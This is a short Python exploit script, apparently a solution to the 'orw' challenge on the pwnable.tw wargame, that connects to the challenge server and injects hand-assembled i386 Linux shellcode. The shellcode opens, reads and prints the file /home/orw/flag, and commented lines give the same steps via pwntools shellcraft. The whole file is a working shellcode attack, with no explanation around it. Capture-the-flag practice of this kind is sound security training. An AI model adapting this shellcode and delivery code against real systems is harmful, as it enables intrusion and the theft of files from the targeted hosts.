from pwn import *

context.update(arch='i386', os='linux')
# r = process('./orw')
r = remote('chall.pwnable.tw', 10001)
shellcode = '''
            open:
                xor ecx, ecx
                push ecx
                push 0x6761
                push 0x6c662f77
                push 0x726f2f65
                push 0x6d6f682f
                mov ebx, esp
                xor eax, eax
                cdq
                mov al, 0x05
                int 0x80
            read:
                mov edi, eax
                mov dl, 1+0xfe
                mov ecx, esp
                mov ebx, edi 
                mov al, 0x3
                int 0x80
            write:
                mov bl,1
                mov al, 0x4
                int 0x80
                '''
# shellcode  = shellcraft.open("/home/orw/flag")
# shellcode += shellcraft.read(3, 'esp', 0x1000)
# shellcode += shellcraft.write(1, 'esp', 'eax')
def solve():
    r.sendlineafter(':',asm(shellcode))
    r.interactive()
if __name__ == '__main__':
    solve()